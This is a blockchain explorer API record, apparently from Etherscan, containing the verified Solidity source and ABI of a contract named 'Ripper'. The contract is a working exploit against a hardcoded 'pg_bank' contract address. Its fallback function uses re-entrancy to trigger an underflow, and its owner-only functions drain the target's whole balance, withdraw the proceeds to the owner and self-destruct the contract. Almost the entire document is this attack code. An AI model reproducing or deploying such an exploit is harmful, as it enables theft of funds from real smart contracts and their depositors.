{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.25;\r\n\r\ncontract pg_bank {\r\n    function Put(uint _unlockTime) public payable;\r\n    function Collect(uint _am) public payable;\r\n}\r\n\r\ncontract Ripper\r\n{\r\n    // modifier\r\n    modifier onlyOwner {\r\n        require(msg.sender == owner_);\r\n        _;\r\n    }\r\n    \r\n    \r\n    // DATASET\r\n    address private owner_;\r\n    bool private attack_;\r\n    pg_bank private bank_;\r\n    \r\n    \r\n    // FUNCTIONS\r\n    constructor() public {\r\n        owner_ = msg.sender;\r\n        attack_ = true;\r\n        bank_ = pg_bank(0xb3e396f500df265CDfdE30Ec6E80DbF99bEE9e96);\r\n    }\r\n    \r\n    function() payable public {\r\n        if (!attack_) {\r\n            return;\r\n        } else {\r\n            attack_ = false;    // no more re-entrancy\r\n            Collect(1 wei);     // cause underflow\r\n        }\r\n    }\r\n    \r\n    function Put() public payable {\r\n        bank_.Put.value(msg.value)(0);\r\n    }\r\n    \r\n    function Collect(uint256 _amount) public {\r\n        bank_.Collect(_amount);\r\n    }\r\n    \r\n    function attack(uint256 _amount) public onlyOwner {\r\n        Collect(_amount);\r\n        Collect(address(bank_).balance);\r\n    }\r\n    \r\n    function withdraw() public onlyOwner {\r\n        uint256 bal = address(this).balance;\r\n        owner_.transfer(bal);\r\n    }\r\n    \r\n    function kill() public onlyOwner {\r\n        selfdestruct(owner_);\r\n    }\r\n    \r\n    function setAttack(bool _atk) public onlyOwner {\r\n        attack_ = _atk;\r\n    }\r\n}","ABI":"[{\"constant\":false,\"inputs\":[],\"name\":\"Put\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_atk\",\"type\":\"bool\"}],\"name\":\"setAttack\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"Collect\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"attack\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Ripper","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"","Library":"","LicenseType":"None","SwarmSource":"bzzr://4d06e5d7fd162737afa4aef49108ae83cefbaf528a62c2fbeafb1539c2645dec"}]}